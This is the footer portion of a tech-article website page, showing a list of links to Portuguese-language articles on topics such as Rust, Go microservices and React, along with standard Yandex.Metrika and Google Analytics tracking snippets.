<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt430290/index.html">Uma tentativa de prever a quarta itera√ß√£o do projeto SpaceX BFR</a></li>
<li><a href="../pt430292/index.html">Electronic Frontier Foundation: o desempenho da rede de placas da pol√≠cia dos EUA √© de 0,5%</a></li>
<li><a href="../pt430294/index.html">10 benef√≠cios n√£o √≥bvios do uso do Rust</a></li>
<li><a href="../pt430296/index.html">Fa√ßa suas id√©ias virem app. Aplicativo sem servidor - instru√ß√µes passo a passo</a></li>
<li><a href="../pt430300/index.html">Microsservi√ßos on Go com o kit Go: Introdu√ß√£o</a></li>
<li><a href="../pt430304/index.html">Um posto avan√ßado maravilhoso em √≥rbita</a></li>
<li><a href="../pt430306/index.html">O primeiro t√∫nel da Companhia Chata perfurado por Ilona Mask</a></li>
<li><a href="../pt430308/index.html">Internos em Python. Ovos de p√°scoa</a></li>
<li><a href="../pt430312/index.html">Valida√ß√£o de formas complexas de React. Parte 1</a></li>
<li><a href="../pt430314/index.html">Outro bot de telegrama ou implementa√ß√£o de bot de namoro</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>